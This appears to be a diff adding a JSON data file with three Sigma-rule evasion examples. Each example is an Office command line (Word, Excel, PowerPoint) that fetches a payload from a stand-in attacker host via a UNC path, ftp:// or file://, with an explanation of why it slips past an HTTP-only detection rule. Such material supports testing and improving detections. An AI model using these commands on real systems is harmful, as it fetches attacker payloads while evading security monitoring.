@@ -1,0 +1,14 @@
+[
+  {
+    "output": "WINWORD.EXE \\evil-server.local\\share\\payload.docx",
+    "explanation": "The Sigma rule specifically targets the 'http://' and 'https://' strings in the command line. An attacker can bypass this by using a UNC path to fetch the remote payload via SMB or WebDAV, which achieves the same arbitrary file download capability without triggering the HTTP-based string match."
+  },
+  {
+    "output": "EXCEL.EXE \"ftp://malicious-domain.com/payload.csv\"",
+    "explanation": "Because the rule's selection_http condition is strictly limited to HTTP and HTTPS protocols, using the FTP protocol handler allows the Office application to download the file while evading the detection logic."
+  },
+  {
+    "output": "POWERPNT.EXE \"file://malicious-domain.com/share/payload.pptx\"",
+    "explanation": "Using the file:// protocol URI scheme pointing to a remote server forces the application to resolve the remote resource (often falling back to SMB) without explicitly writing 'http://' or 'https://' in the command line."
+  }
+]
